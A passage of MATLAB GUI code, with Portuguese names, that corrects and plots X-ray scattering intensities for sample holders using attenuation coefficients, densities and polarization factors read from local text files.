       PA_02_VZ ...
       PA_04_VZ ...
       Tamos ...
       IPA ...
       Q ...
       K...
       Polarizacao...
       volume...
       TETA ...
       tipoSelecionado ...
       pa1fr...
       pa2fr...
       pa3fr...
       pa4fr...
       paMedio...
       fc2...
       r0;
   
     pa1fr  =zeros(length(Q),1);
     pa2fr  =zeros(length(Q),1);
     pa3fr  =zeros(length(Q),1);
     pa4fr  =zeros(length(Q),1);
     paMedio=zeros(length(Q),1);
%      
%      expotarTipoNomeFinal = strcat('amostras_',tipoSelecionado,'_',date,'.xlsx');
     expotarTipoNome= strcat('amostras_',tipoSelecionado,'_',date,'.xlsx');
%      startingFolder       = strcat( caminhoDosArquivosDeTexto ,'arquivosSalvos');
%      
%      defaultFileName       = fullfile(startingFolder, expotarTipoNomeFinal );
%     [baseFileName, expotarTipoNome] = uiputfile(defaultFileName, 'Salvar Como' );
%         if (baseFileName == 0)
%              return;
%         end

     
     pa1fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_01_PLS_1MIN(1:angCritico  ,1);
     pa1fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_01_PLS_1MIN(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_01_VZ(angCritico:end,1);

     pa2fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_02_PLS(1:angCritico  ,1);
     pa2fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_02_PLS(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_02_VZ(angCritico:end,1);
     
     pa3fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_03_PLS(1:angCritico  ,1);
     pa3fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_03_PLS(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_03_VZ_REP(angCritico:end,1);
     
     pa4fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_04_PLS(1:angCritico  ,1);
     pa4fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_04_PLS(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_04_VZ(angCritico:end,1);

     paMedio(     1       :angCritico,1) = Tar(1:angCritico  ,1).*IAR(1:angCritico  ,1) +  IFilme(1:angCritico  ,1);
     paMedio(angCritico   :end       ,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  IFilme(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*IPA(angCritico:end,1);

        
     pa1fr=pa1fr(:,1)./Tpvc(:,1);
     pa2fr=pa2fr(:,1)./Tpvc(:,1);
     pa3fr=pa3fr(:,1)./Tpvc(:,1);
     pa4fr=pa4fr(:,1)./Tpvc(:,1);
     paMedio=paMedio(:,1)./Tpvc(:,1);

     fc =K(:,1).*Polarizacao(:,1).*volume(:,1);
     fc2=1./(fc);
     fc2(1:10,1)=1;
     r0 =((2.83E-15^2)/2).*(1+power(cos(TETA(:,1)*pi()/40),2));


   
   arquivoSelecionados = cellstr(get(handles.listbox1,'String'));
   cont=0;
  
   auxSemCorr = zeros(length(PA_02_PLS),length(arquivoSelecionados))';
   auxCorrigida  = zeros(length(PA_02_PLS),length(arquivoSelecionados))';
   auxCorrigidaMedia= zeros(length(PA_02_PLS),length(arquivoSelecionados))';
   auxImedida= zeros(length(PA_02_PLS),length(arquivoSelecionados))';
   auxImedidaMedia= zeros(length(PA_02_PLS),length(arquivoSelecionados))';
   auxInormalizacao = zeros(length(PA_02_PLS),length(arquivoSelecionados))';
   auxFinalmediadaMaisNorm = zeros(length(PA_02_PLS),length(arquivoSelecionados))' ;
   auxFinalmediadaMaisNormMedia = zeros(length(PA_02_PLS),length(arquivoSelecionados))' ;
   normalizaAmostra = zeros(length(PA_02_PLS),length(arquivoSelecionados))' ;
   normalizaMedia   = zeros(length(PA_02_PLS),length(arquivoSelecionados))' ;
   
            %    data1 = zeros(2,length(arquivoSelecionados))' ;
  for x=1:length(arquivoSelecionados)
                [Arqselecionado  ,~] = strsplit(arquivoSelecionados{x} , ' [','CollapseDelimiters',true);
                [tipoPortaAmostra,~] = strsplit(char(Arqselecionado(1)),{' ','.txt'},'CollapseDelimiters',true);
                txtSelect = char((strcat(caminhoDosArquivosDeTexto,pastaSelecionada,'\',Arqselecionado(1))));
                 [tipo,~] = strsplit(pastaSelecionada,'\','CollapseDelimiters',true);
                 
                    legendInfo(x,1) =  tipoPortaAmostra(1);  % or whatever is appropriate
                           
                 data1(x,:)= [tipoPortaAmostra(1) tipoPortaAmostra(2) tipo(2)];
            %      cellstr(data1{x})

                if( isempty(char(Arqselecionado(1))))
                    aux1 =strcat('Selecione uma opção valida, a pasta: [ ',caminhoDosArquivosDeTexto,pastaSelecionada,'] parece estar vazia ')
                     uiwait(warndlg(aux1));
                     return          
                end
% 
%                     [valores, ...
%                      plotFinal, ...
%                      plotFinal2,...
%                      normalizacao,...
%                      Iamostra, ...
%                      IamostraMedia, ...
%                      plotCorrigido,...
%                      plotCorrigidoMedio,...
%                      noramlizada, ...
%                      noramlizada2] =     readFile(txtSelect,tipoPortaAmostra(2),handles);

        [valores, ...
         Iamostra, ...
         IamostraMedia, ...
         plotCorrigido,...
         plotCorrigidoMedio] = readFile(txtSelect,tipoPortaAmostra(2),handles);

               auxSemCorrigir (x,:)   =      valores;
               auxCorrigida(x,:)      =      plotCorrigido;
               auxCorrigidaMedia(x,:) =      plotCorrigidoMedio;
               auxImedida(x,:)        =      Iamostra;
               auxImedidaMedia(x,:)   =      IamostraMedia;
%                auxInormalizacao(x,:)  =      normalizacao;
%                auxFinalmediadaMaisNorm(x,:) = plotFinal;
%                auxFinalmediadaMaisNormMedia(x,:) = plotFinal2;
              
               cont = cont +1;
 end
      
               figure(8)
               legend(legendInfo)
               title('por PA')
               figure(9)
               title('por Média dos PAs 1-4')
               legend(legendInfo)
               
   h = waitbar(0,'Exportando resultados para excel..');
   warning('off','MATLAB:xlswrite:addSheet')
   i=0;
   
%     xlswrite (expotarTipoNome, data1,'semCorreção','A1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, data1,'correção','A1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, data1,'correção Média','A1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, data1,'Im(só transmição)','A1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, data1,'Im(só trans) Média','A1');
%     i=i+1;  waitbar(i/10);
%  
%     xlswrite (expotarTipoNome, auxSemCorrigir,'semCorreção','D1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, auxCorrigida,'correção','D1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, auxCorrigidaMedia,'correção Média','D1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, auxImedida,'Im(só transmição)','D1');
%     i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, auxImedidaMedia,'Im(só trans) Média','D1');
%     i=i+1;  waitbar(i/10);
%     




%nao usar
%     xlswrite (expotarTipoNome, data1,'Corr. (esxp+norm)','A1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, data1,'Corr.(esxp+norm)Média','A1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, data1,'semCorreção','A1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, data1,'expurias+r0','A1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, data1,'espurias+r0 Média','A1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, data1,'Im(só transmição)','A1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, data1,'Im(só trans) Média','A1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, data1,'normalização p.amostra','A1');
%     ii=ii+1;  waitbar(ii/16);
%     
%     xlswrite (expotarTipoNome, auxFinalmediadaMaisNorm,'Corr. (esxp+norm)','D1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, auxFinalmediadaMaisNormMedia,'Corr.(esxp+norm)Média','D1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, auxSemCorrigir,'semCorreção','D1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, auxCorrigida,'expurias+r0','D1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, auxCorrigidaMedia,'espurias+r0 Média','D1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, auxImedida,'Im(só transmição)','D1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, auxImedidaMedia,'Im(só trans) Média','D1');
%     ii=ii+1;  waitbar(ii/16);
%     xlswrite (expotarTipoNome, auxInormalizacao,'normalização p.amostra','D1');
%     ii=ii+1;  waitbar(ii/16);
%          
%    delete(h)  
   
function [valores, ...
          Iamostra, ...
         IamostraMedia, ...
         plotCorrigido,...
         plotCorrigidoMedio] = readFile(enderecoDoAqrquvo,pAselecionadox,handles)
     
%      [valores, ...
%          plotFinal, ...
%          plotFinal2,...
%          normalizacao,...
%          Iamostra, ...
%          IamostraMedia, ...
%          plotCorrigido,...
%          plotCorrigidoMedio,...
%          noramlizada, ...
%          noramlizada2] = readFile(enderecoDoAqrquvo,pAselecionadox,handles)
        global     ...
                   K...
                   Polarizacao...
                   volume...
                   pa1fr...
                   pa2fr...
                   pa3fr...
                   pa4fr...
                   paMedio...
                   Tpvc ...
                   Q ...
                   r0; 

                         fid = fopen(enderecoDoAqrquvo);
                         tline = fgetl(fid);
                         ok=0;
                         i=0;
                         tamanho=234;
                                             valores = nan(tamanho, 1);
                                             while ischar(tline)
                                                                      delimiter= findstr('<2Theta>', tline);
                                                                       tam=size(delimiter);
                                                             if((ok>0) |  (delimiter > 0) )
                                                                    ok=ok+1;
                                                             end

                                                             if(ok>1)
                                                                 convertePataFloat = strread(tline,'%f','delimiter',' ');
                                                                 i=i+1;
%                                                                  valores(i,1) = convertePataFloat(1);
                                                                 valores(i,1) = convertePataFloat(2);
                                                             end
                                                 tline = fgetl(fid);
                                             end
                            fclose(fid);     

% /---------- para H20 1min

achei =false;
        if(strcmp(pAselecionadox,'PA01'))
%             Iamostra      =  valores(:,1)./Tpvc(:,1) - pa1fr(:,1)- K(:,1);
%             plotCorrigido = (Iamostra(:,1)./(Polarizacao(:,1).*volume(:,1))).*r0(:,1);
%             Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa1fr(:,1)).*1./(K(:,1)+volume).*Polarizacao;
              Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa1fr(:,1)).*1./K(:,1).*volume.*Polarizacao;
              plotCorrigido = Iamostra;
achei =true;
        end
        if(strcmp(pAselecionadox,'PA02'))
%             Iamostra      =  valores(:,1)./Tpvc(:,1) - pa2fr(:,1)- K(:,1);
%             plotCorrigido = (Iamostra(:,1)./(Polarizacao(:,1).*volume(:,1))).*r0(:,1);    
%             Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa2fr(:,1)).*1./(K(:,1)+volume).*Polarizacao;
            Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa2fr(:,1)).*1./K(:,1).*volume.*Polarizacao;
              plotCorrigido = Iamostra;
achei =true;        
        end
        if(strcmp(pAselecionadox,'PA03'))
%             Iamostra      =  valores(:,1)./Tpvc(:,1) - pa3fr(:,1)- K(:,1);
%             plotCorrigido = (Iamostra(:,1)./(Polarizacao(:,1).*volume(:,1))).*r0(:,1);
             % Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa3fr(:,1)).*1./(K(:,1)+volume).*Polarizacao;
              Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa3fr(:,1)).*1./K(:,1).*volume.*Polarizacao;
              plotCorrigido = Iamostra;
achei =true;                            
        end
        if(strcmp(pAselecionadox,'PA04'))
%             Iamostra      =  valores(:,1)./Tpvc(:,1) - pa4fr(:,1)- K(:,1);
%             plotCorrigido = (Iamostra(:,1)./(Polarizacao(:,1).*volume(:,1))).*r0(:,1);
             % Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa4fr(:,1)).*1./(K(:,1)+volume).*Polarizacao;
              Iamostra      =  (valores(:,1)./Tpvc(:,1)- pa4fr(:,1)).*1./K(:,1).*volume.*Polarizacao;
              plotCorrigido = Iamostra;
achei =true;
        end
        
        if(~achei)
            plotCorrigido=zeros(length(Q),1);
         plotCorrigidoMedio=zeros(length(Q),1);
           IamostraMedia   =  (valores(:,1)./Tpvc(:,1)-paMedio(:,1)).*1./K(:,1).*volume.*Polarizacao; 
          %IamostraMedia   =  (valores(:,1)./Tpvc(:,1)- paMedio(:,1)).*1./(K(:,1)+volume).*Polarizacao;
          Iamostra=IamostraMedia;
%          IamostraMedia      =  valores(:,1)./Tpvc(:,1) - paMedio(:,1)- K(:,1);
%          plotCorrigidoMedio = (IamostraMedia(:,1)./(Polarizacao(:,1).*volume(:,1))).*r0(:,1); 

%          plotCorrigido = Iamostra;
         plotCorrigido      = smooth( IamostraMedia);
         plotCorrigidoMedio = smooth( IamostraMedia);
         else
%          IamostraMedia      =  valores(:,1)./Tpvc(:,1) - paMedio(:,1)- K(:,1);
%          plotCorrigidoMedio = (IamostraMedia(:,1)./(Polarizacao(:,1).*volume(:,1))).*r0(:,1);
         IamostraMedia      =  (valores(:,1)./Tpvc(:,1)-paMedio(:,1)).*1./K(:,1).*volume.*Polarizacao;
         %IamostraMedia   =  (valores(:,1)./Tpvc(:,1)- paMedio(:,1)).*1./(K(:,1)+volume).*Polarizacao;
         plotCorrigido      = smooth( plotCorrigido);
         plotCorrigidoMedio = smooth( IamostraMedia);
         end
       
%         normalizacao =    [ 8.12	8.12	8.12	8.10	8.09	8.07	8.05	8.01	7.99	7.95	7.91	7.86	7.82	7.77	7.72	7.66	7.60	7.54	7.47	7.40	7.34	7.26	7.19	7.11	7.03	6.95	6.87	6.79	6.71	6.62	6.54	6.45	6.36	6.27	6.19	6.10	6.01	5.92	5.84	5.75	5.66	5.57	5.49	5.40	5.32	5.24	5.15	5.07	4.99	4.91	4.83	4.75	4.68	4.60	4.52	4.45	4.38	4.31	4.24	4.17	4.10	4.04	3.97	3.91	3.85	3.78	3.72	3.67	3.61	3.55	3.50	3.44	3.39	3.34	3.29	3.24	3.19	3.15	3.10	3.06	3.01	2.97	2.93	2.89	2.85	2.81	2.77	2.74	2.70	2.67	2.63	2.60	2.57	2.54	2.51	2.48	2.45	2.42	2.39	2.37	2.34	2.32	2.29	2.27	2.25	2.22	2.20	2.18	2.16	2.14	2.12	2.10	2.08	2.06	2.05	2.03	2.01	1.99	1.98	1.96	1.95	1.93	1.92	1.91	1.89	1.88	1.87	1.85	1.84	1.83	1.82	1.81	1.79	1.78	1.77	1.76	1.75	1.74	1.73	1.72	1.71	1.71	1.70	1.69	1.68	1.67	1.67	1.66	1.65	1.64	1.64	1.63	1.62	1.62	1.61	1.60	1.59	1.59	1.58	1.57	1.57	1.56	1.55	1.53	1.52	1.51	1.50	1.49	1.48	1.47	1.46	1.45	1.44	1.44	1.43	1.42	1.41	1.40	1.39	1.39	1.38	1.36	1.34	1.33	1.31	1.30	1.28	1.27	1.25	1.24	1.22	1.20	1.19	1.18	1.20	1.19	1.18	1.165335835	1.15	1.13	1.14	1.13	1.12	1.11	1.11	1.10	1.09	1.08	1.08	1.07	1.06	1.05	1.04	1.04	1.03	1.02	1.01	1.01	1.00	0.99	0.98	0.97	0.97	0.96	0.95	0.943643389	0.94	0.93	0.92	0.91	0.90	0.90	0.89	0.88 ]';
%         normalizacao =    normalizacao.*(2.83E-25)/4;
%     
        MostrarNegv = get(handles.negv,'Value'); 
        if(MostrarNegv>0)
             plotCorrigido(plotCorrigido<0)=0;
             plotCorrigidoMedio(plotCorrigidoMedio<0)=0;
        end
%         expValue=floor(log10(max(plotCorrigido))); 
%         expValue2=floor(log10(max(plotCorrigidoMedio))); 
%         coun = 0;
%         
%  for x=1:8
%      x=x/2;
%     if(max(normalizacao)>max(plotCorrigido(2:end,1)))
%             normalizacao1=normalizacao/(1.3*x*0.5);
%             curvexy = [Q plotCorrigido];
%             
%             
%             mapxy   = [Q normalizacao1];
%             [xy,distance,t] = distance2curve(curvexy,mapxy,'linear');
%             distancia = distance.*power(1E+1,abs(expValue));
%             coun = coun +1;
%             
%             curvexy2 = [Q plotCorrigidoMedio];
%             mapxy2   = [Q normalizacao1];
%             [xy2,distance2,t2] = distance2curve(curvexy2,mapxy2,'linear');
%             distancia2 = distance2.*power(1E+1,abs(expValue2));
%             coun = coun +1;
%             
%     end
%     if(coun == 0 & (max(plotCorrigido(2:end))>max(normalizacao)))
%             curvexy = [Q plotCorrigido];
%             normalizacao1=normalizacao/(1.3*x);
%             mapxy   = [Q normalizacao1];
%             expValue=floor(log10(max(plotCorrigido))); 
%             [xy,distance,t] = distance2curve(curvexy,mapxy,'linear');
%             distancia = distance.*power(1E+1,abs(expValue));
%             
%              curvexy2 = [Q plotCorrigidoMedio];
%              mapxy2   = [Q normalizacao];
%             [xy2,distance2,t2] = distance2curve(curvexy2,mapxy2,'linear');
%              distancia2 = distance2.*power(1E+1,abs(expValue2));
%              coun = coun +1;
%             
%         continue
%     end
% end
% 
%          a = find(abs(distancia)<2E-1);
%          a = a(a > 60);
%          
%          a2 = find(abs(distancia2)<2E-1);
%          a2 = a2(a2 > 60);
%        
%         aux = min(Q(a(:)));
%         aux2 = min(Q(a2(:)));
%         if(isempty(aux))
%             a = [150 152]';
%         end
%         
%         if(isempty(aux2))
%              a2 = [150 152]';
%         end
%         
%          a(1)=a(1)+10;
%          a2(1)=a2(1)+10;
%         n=plotCorrigido(a(1):end);
%         n2=plotCorrigidoMedio(a2(1):end);
% 
% 
%         ntotal=length(n(:,1));
%         ntotal2=length(n2(:,1));
%         for x=1:length(n)
%         noramlizada =  (((1/ntotal )*(normalizacao1(x,1))/n(x) ));
%         aa (x) = sum(noramlizada).*1E-24;
%         end
%         for x=1:length(n2) 
%         noramlizada2 = (((1/ntotal2)*(normalizacao1(x,1))/n2(x))); 
%         aa2(x) = sum(noramlizada2).*1E-24;
%         end
%         
%         
%         bb=aa;
%         noramlizada = aa;
%         bb2=aa2;
%         noramlizada2 = aa2;
%               yy =  bb (1)- plotCorrigido(round(a(1)));
%               yy2 = bb2(1)- plotCorrigidoMedio(round(a2(1)));
% 
% %         if(0>yy)
%         plotFinal = plotCorrigido;
%         plotFinal(a(1):end) =bb-yy;
% %         else
% %         plotFinal = plotCorrigido;
% %         plotFinal(a(1):end) =bb+yy;
% %         end
%         
% %         if(0>yy2)
%         plotFinal2            = plotCorrigidoMedio;
%         plotFinal2(a2(1):end) = bb2-yy2;
% %         else
% %         plotFinal2            =  plotCorrigidoMedio;
% %         plotFinal2(a2(1):end) =  bb2+yy2;
% %         end
%         
 
        
        figure(8)
        hold on
        grid on
        plot(Q,plotCorrigido)
        hold all
        
        figure(9)
        hold on
        grid on
        plot(Q,plotCorrigidoMedio)
        
%         legend()
        hold all
        
        figure(10)
        hold on
        grid on
        plot(valores)
%         legend()
        hold all


%##############################################################################
function listbox1_CreateFcn              (hObject, ~, ~ )
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function selecionaCaso_Callback(~, ~, handles      )
global caminhoDosArquivosDeTexto ...
       pastaSelecionada ...
       tipoSelecionado;
set(handles.listbox1,'String','');
todosTipos = cellstr(get(handles.selecionaCaso,'String')); 
tipoSelecionado = todosTipos{get(handles.selecionaCaso,'Value')};
pastaSelecionada = strcat('textData\',tipoSelecionado);
files = dir(fullfile(caminhoDosArquivosDeTexto,pastaSelecionada,'*.txt'));
set(handles.listbox1,'Value',1);
todosTipos = {files.name};
todosDAtas = {files.date};


for x=1: length({files.name})
 dadoss{x} =   strcat(todosTipos{x},'           [',todosDAtas{x},']');
end
todosNomes=cell2struct(dadoss,'nomes',1);
 
set(handles.listbox1,'String',{todosNomes.nomes});
    set(handles.listbox2,'String',{'Intensidade do Porta Amostra Vazio',...
    'Intensidade do Filme',...
    'Intensidade da H20 1Min', ...
    'Intensidade do Ar' });
function p1_Callback           (hObject, ~, handles)
global caminhoDosArquivosDeTexto;
           contents       =    cellstr(get(hObject,'String'));
           aux            =    strcat( contents{get(hObject,'Value')},'.txt'); 
           nomeDensidade  =    contents{get(hObject,'Value')};
           txtSelect      =    strcat(caminhoDosArquivosDeTexto,'AttCoefficients\',aux);
           txtDensidade   =    strcat(caminhoDosArquivosDeTexto,'densidades.txt');
           set(handles.text14,'String',contents{get(hObject,'Value')});
           fid   = fopen(txtSelect);
           tline = fgetl(fid);
           i=0;
           
            
                   while ischar(tline)
                           convertePataFloat = strread(tline,'%f','delimiter','K');
                           i=i+1;
                           [tam, ~] =size(convertePataFloat);
                         if(tam>3)
                           dadosSelecionados(i,:)=convertePataFloat(2:4)';
                         else
                           dadosSelecionados(i,:) = convertePataFloat';
                         end
                           tline = fgetl(fid);
                    end
                    fclose(fid);
                    mostarTabela= get(handles.energia,'Value');
                    dadosSelecionados(:,1)= dadosSelecionados(:,1).*1000;
                    valorEnergia=get(handles.edit16,'String');
                    
                    if(valorEnergia< 1 | isnan(str2double(valorEnergia)))
                    uiwait(warndlg('Medidas não encontradas ou invalidas. Para continuar é preciso inserir medidas validas'));
                    set(handles.aa,'BackgroundColor','red');
                    set(handles.bb,'BackgroundColor','red');
                    set(handles.hhh,'BackgroundColor','red');
                    set(handles.edit16,'BackgroundColor','red');
                    return
                    end
                    set(handles.p11,'BackgroundColor','green');
                    set(handles.p12,'BackgroundColor','green');
                    
                    fid = fopen(txtDensidade);
                    tline = fgetl(fid);
                    i=0;
                    while ischar(tline)
                         convertePataFloat = strread(tline,'%s','delimiter','|');
                         convertePataFloat2 = strread(convertePataFloat{2},'%f','delimiter',' ');
                         densidade = convertePataFloat2(3);
                         if(isequal(nomeDensidade,convertePataFloat{1}))
                             
                         densidadeSelecionada=densidade;
                         set(handles.p12,'String',densidade)
                         end
                         tline = fgetl(fid);
                    end
                    fclose(fid);
                    achou=false;
                    for x=1:size(dadosSelecionados)
                        
                    if(isequal(round(dadosSelecionados(x,1)),round(str2double(valorEnergia)))&& ~achou)
                        miu=dadosSelecionados(x,2)*densidadeSelecionada;
                        set(handles.p11,'String',miu);
                        achou=true;
                    end
                    end
                    if(mostarTabela)
                         ColunaNomes = {'(Kev)' '(cm^2/g)' 'mu(en)/rho'}; 
                         set(handles.tabela2,'ColumnName',ColunaNomes);
                         set(handles.tabela2,'Data',dadosSelecionados);
                         set(handles.tabela2, 'ColumnWidth',{60},'units','Normalized');
                   end
function p2_Callback           (hObject, ~, handles)
global caminhoDosArquivosDeTexto;
contents = cellstr(get(hObject,'String'));
          aux= strcat( contents{get(hObject,'Value')},'.txt'); 
          nomeDensidade=contents{get(hObject,'Value')};
 txtSelect   = strcat(caminhoDosArquivosDeTexto,'AttCoefficients\',aux);
 txtDensidade= strcat(caminhoDosArquivosDeTexto,'densidades.txt');
                    fid = fopen(txtSelect);
                    tline = fgetl(fid);
                    i=0;
                    
                    valorEnergia=get(handles.edit16,'String');
                    if(valorEnergia< 1 | isnan(str2double(valorEnergia)))
                    uiwait(warndlg('Medidas não encontradas ou invalidas. Para continuar é preciso inserir medidas validas'));
                    set(handles.aa,'BackgroundColor','red');
                    set(handles.bb,'BackgroundColor','red');
                    set(handles.hhh,'BackgroundColor','red');
                    set(handles.edit16,'BackgroundColor','red');
                    return
                    end
                    set(handles.p21,'BackgroundColor','green');
                    set(handles.p22,'BackgroundColor','green');
                    
                    while ischar(tline)
                         convertePataFloat = strread(tline,'%f','delimiter','K');
                         i=i+1;
                         [tam, ~] =size(convertePataFloat);
                         if(tam>3)
                           dadosSelecionados(i,:)=convertePataFloat(2:4)';
                         else
                           dadosSelecionados(i,:) = convertePataFloat';
                         end
                         tline = fgetl(fid);
                    end
                    fclose(fid);
                    mostarTabela= get(handles.energia,'Value');
                    
                    dadosSelecionados(:,1)= dadosSelecionados(:,1).*1000;
                    fid = fopen(txtDensidade);
                    tline = fgetl(fid);
                    i=0;
                    while ischar(tline)
                         convertePataFloat = strread(tline,'%s','delimiter','|');
                         convertePataFloat2 = strread(convertePataFloat{2},'%f','delimiter',' ');
                         densidade = convertePataFloat2(3);
                         if(isequal(nomeDensidade,convertePataFloat{1}))
                             
                         densidadeSelecionada=densidade;
                         set(handles.p22,'String',densidade)
                         end
                         tline = fgetl(fid);
                    end
                    fclose(fid);

                    achou=false;
                    for x=1:size(dadosSelecionados)
                    if(isequal(round(dadosSelecionados(x,1)),round(str2double(valorEnergia)))&& ~achou)
                        achou=true;
                        miu=dadosSelecionados(x,2)*densidadeSelecionada;
                        set(handles.p21,'String',miu);
                    end
                    end
                   if(mostarTabela)
                         ColunaNomes = {'(Kev)' '(cm^2/g)' 'mu(en)/rho'}; 
                         set(handles.tabela2,'ColumnName',ColunaNomes);
                         set(handles.tabela2,'Data',dadosSelecionados);
                         set(handles.tabela2, 'ColumnWidth',{40},'units','Normalized');
                   end
function p3_Callback           (hObject, ~, handles)
global caminhoDosArquivosDeTexto;

contents = cellstr(get(hObject,'String'));
          aux= strcat( contents{get(hObject,'Value')},'.txt'); 
          nomeDensidade=contents{get(hObject,'Value')};
 txtSelect   = strcat(caminhoDosArquivosDeTexto,'AttCoefficients\',aux);
 txtDensidade= strcat(caminhoDosArquivosDeTexto,'densidades.txt');
                    fid = fopen(txtSelect);
                    tline = fgetl(fid);
                    i=0;
                    
                                        valorEnergia=get(handles.edit16,'String');
                    if(valorEnergia< 1 | isnan(str2double(valorEnergia)))
                    uiwait(warndlg('Medidas não encontradas ou invalidas. Para continuar é preciso inserir medidas validas'));
                    set(handles.aa,'BackgroundColor','red');
                    set(handles.bb,'BackgroundColor','red');
                    set(handles.hhh,'BackgroundColor','red');
                    set(handles.edit16,'BackgroundColor','red');
                    return
                    end
                    set(handles.p31,'BackgroundColor','green');
                    set(handles.p32,'BackgroundColor','green');
                    
                    
                    
                    while ischar(tline)
                         convertePataFloat = strread(tline,'%f','delimiter','K');
                         i=i+1;
                         [tam, ~] =size(convertePataFloat);
                         if(tam>3)
                           dadosSelecionados(i,:)=convertePataFloat(2:4)';
                         else
                           dadosSelecionados(i,:) = convertePataFloat';
                         end
                         tline = fgetl(fid);
                    end
                    fclose(fid);
                    mostarTabela= get(handles.energia,'Value');
                    
                    dadosSelecionados(:,1)= dadosSelecionados(:,1).*1000;
                    fid = fopen(txtDensidade);
                    tline = fgetl(fid);
                    i=0;
                    while ischar(tline)
                         convertePataFloat = strread(tline,'%s','delimiter','|');
                         convertePataFloat2 = strread(convertePataFloat{2},'%f','delimiter',' ');
                         densidade = convertePataFloat2(3);
                         if(isequal(nomeDensidade,convertePataFloat{1}))
                             
                         densidadeSelecionada=densidade;
                         set(handles.p32,'String',densidade)
                         end
                         tline = fgetl(fid);
                    end
                    fclose(fid);

                    achou=false;
                    for x=1:size(dadosSelecionados)
                    if(isequal(round(dadosSelecionados(x,1)),round(str2double(valorEnergia)))&& ~achou)
                        achou=true;
                        miu=dadosSelecionados(x,2)*densidadeSelecionada;
                        set(handles.p31,'String',miu);
                    end
                    end
                   if(mostarTabela)
                         ColunaNomes = {'(Kev)' '(cm^2/g)' 'mu(en)/rho'}; 
                         set(handles.tabela2,'ColumnName',ColunaNomes);
                         set(handles.tabela2,'Data',dadosSelecionados);
                         set(handles.tabela2, 'ColumnWidth',{40},'units','Normalized');
                   end
function p4_Callback           (hObject, ~, handles)
global caminhoDosArquivosDeTexto;
contents = cellstr(get(hObject,'String'));
          aux= strcat( contents{get(hObject,'Value')},'.txt'); 
          nomeDensidade=contents{get(hObject,'Value')};
 txtSelect   = strcat(caminhoDosArquivosDeTexto,'AttCoefficients\',aux);
 txtDensidade= strcat(caminhoDosArquivosDeTexto,'densidades.txt');
                    fid = fopen(txtSelect);
                    tline = fgetl(fid);
                    i=0;
                    valorEnergia=get(handles.edit16,'String');
                    if(valorEnergia< 1 | isnan(str2double(valorEnergia)))
                    uiwait(warndlg('Medidas não encontradas ou invalidas. Para continuar é preciso inserir medidas validas'));
                    set(handles.aa,'BackgroundColor','red');
                    set(handles.bb,'BackgroundColor','red');
                    set(handles.hhh,'BackgroundColor','red');
                    set(handles.edit16,'BackgroundColor','red');
                    return
                    end
                    set(handles.p41,'BackgroundColor','green');
                    set(handles.p42,'BackgroundColor','green');
                    
                    while ischar(tline)
                         convertePataFloat = strread(tline,'%f','delimiter','K');
                         i=i+1;
                         [tam, ~] =size(convertePataFloat);
                         if(tam>3)
                           dadosSelecionados(i,:)=convertePataFloat(2:4)';
                         else
                           dadosSelecionados(i,:) = convertePataFloat';
                         end
                         tline = fgetl(fid);
                    end
                    fclose(fid);
                    mostarTabela= get(handles.energia,'Value');
                    
                    dadosSelecionados(:,1)= dadosSelecionados(:,1).*1000;
                    fid = fopen(txtDensidade);
                    tline = fgetl(fid);
                    i=0;
                    while ischar(tline)
                         convertePataFloat = strread(tline,'%s','delimiter','|');
                         convertePataFloat2 = strread(convertePataFloat{2},'%f','delimiter',' ');
                         densidade = convertePataFloat2(3);
                         if(isequal(nomeDensidade,convertePataFloat{1}))
                             
